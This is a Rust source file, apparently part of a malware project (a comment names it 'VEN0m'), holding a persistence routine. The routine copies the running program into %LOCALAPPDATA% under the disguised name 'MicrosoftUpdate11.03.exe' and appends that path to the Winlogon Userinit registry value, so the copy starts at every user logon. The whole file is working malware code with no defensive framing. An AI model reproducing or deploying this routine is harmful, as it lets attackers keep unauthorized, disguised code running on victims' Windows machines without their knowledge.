use anyhow::{Result, Context};
use winreg::RegKey;
use winapi::um::winreg::{HKEY_LOCAL_MACHINE};


pub fn persist() -> Result<()> {
    
    let result: Result<()> = (|| {
        let current_exe = std::env::current_exe().context("Failed to get current executable path")?;
        let current_exe_str = current_exe.to_string_lossy();
        // copy the executable tom %LOCALAPPDATA%
        let user_profile = std::env::var("LOCALAPPDATA").context("[!] Failed to get USERPROFILE!")?;
        let new_path = format!("{}\\MicrosoftUpdate11.03.exe", user_profile);
        
        std::fs::copy(&current_exe, &new_path)?;        
        
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        
        let (key, _disp) = hklm
            .create_subkey(path)
            .context("Failed to create/open Winlogon registry key")?;

        // Read the Userinit value
        let userinit: String = key
            .get_value("Userinit")
            .unwrap_or_else(|_| "C:\\Windows\\system32\\userinit.exe,".to_string());

        // Append VEN0m to Userinit if not present
        if !userinit.contains(&new_path) {
            let new_userinit = format!("{},{}", userinit.trim_end_matches(','), new_path);
            key.set_value("Userinit", &new_userinit)
                .context("Failed to set Userinit registry value")?;
        }
        
        Ok(())
    })();
    
    // Silently continue if persistence fails
    match result {
        Ok(_) => println!(" -> Program configured to run at user logon via Winlogon."),
        Err(e) => println!("[!] Persistence failed: {}", e),
    }
    
    Ok(())
}

